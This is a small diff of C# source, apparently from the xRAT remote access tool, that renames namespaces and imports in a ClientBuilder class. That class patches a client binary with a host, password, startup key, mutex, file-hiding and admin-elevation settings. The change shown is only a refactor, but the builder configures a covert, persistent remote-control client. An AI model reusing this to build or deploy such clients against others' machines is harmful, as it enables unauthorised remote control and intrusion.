@@ -1,19 +1,17 @@
-﻿using Core.Encryption;
+﻿using System;
 using Mono.Cecil;
 using Mono.Cecil.Cil;
-using System;
-using System.Windows.Forms;
 using Vestris.ResourceLib;
-using xRAT_2.Settings;
+using xServer.Core.Encryption;
 
-namespace Core.Build
+namespace xServer.Core.Build
 {
     class ClientBuilder
     {
         public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
         {
             // PHASE 1 - Settings
-            string encKey = Helper.GetRandomName(20);
+            string encKey = Helper.Helper.GetRandomName(20);
             AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly("client.bin");
 
             foreach (var typeDef in asmDef.Modules[0].Types)
